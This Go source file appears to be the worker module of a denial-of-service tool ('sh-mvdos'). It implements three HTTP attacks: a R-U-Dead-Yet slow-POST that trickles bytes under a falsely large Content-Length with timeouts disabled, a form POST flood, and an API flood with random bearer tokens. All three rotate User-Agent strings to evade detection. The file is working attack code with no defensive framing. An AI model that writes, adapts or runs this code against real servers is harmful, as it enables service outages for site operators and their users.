package worker

import (
	"context"
	"io"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/kjsst/sh-mvdos/internal/worker/evasion"
	"github.com/kjsst/sh-mvdos/internal/worker/payload"
)

type slowReader struct {
	ctx   context.Context
	data  []byte
	pos   int
	delay time.Duration
}

func (r *slowReader) Read(p []byte) (int, error) {
	select {
	case <-r.ctx.Done():
		return 0, io.EOF
	default:
	}
	if r.pos >= len(r.data) {
		r.pos = 0
	}
	p[0] = r.data[r.pos]
	r.pos++
	time.Sleep(r.delay)
	return 1, nil
}

func httpRudy(ctx context.Context, targetURL string, client *http.Client) error {
	declaredSize := 1024*1024 + rand.Intn(50*1024*1024)
	chunk := payload.RudyChunk()

	slow := &slowReader{
		ctx:   ctx,
		data:  chunk,
		delay: time.Duration(500+rand.Intn(2000)) * time.Millisecond,
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, targetURL, slow)
	if err != nil {
		return err
	}
	req.ContentLength = int64(declaredSize)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", evasion.RandUA())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")

	rudyClient := *client
	rudyClient.Timeout = 0
	if t, ok := rudyClient.Transport.(*http.Transport); ok {
		tClone := t.Clone()
		tClone.ResponseHeaderTimeout = 0
		tClone.IdleConnTimeout = 0
		rudyClient.Transport = tClone
	}

	resp, err := rudyClient.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

func httpPost(ctx context.Context, targetURL string, client *http.Client) error {
	body, contentType := payload.FormPayload()
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, targetURL, strings.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("Content-Length", strconv.Itoa(len(body)))
	req.Header.Set("User-Agent", evasion.RandUA())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Connection", "keep-alive")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

func httpAPIFlood(ctx context.Context, baseURL string, client *http.Client) error {
	suffix, body := payload.APIPayload()
	fullURL := trimSlash(baseURL) + suffix
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, fullURL, strings.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Content-Length", strconv.Itoa(len(body)))
	req.Header.Set("User-Agent", evasion.RandUA())
	req.Header.Set("Accept", "application/json")
	req.Header.Set("X-Request-ID", payload.RandString(32))
	req.Header.Set("Authorization", "Bearer "+payload.RandString(64))
	req.Header.Set("Origin", baseURL)
	req.Header.Set("Connection", "keep-alive")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

func trimSlash(u string) string {
	return strings.TrimRight(u, "/")
}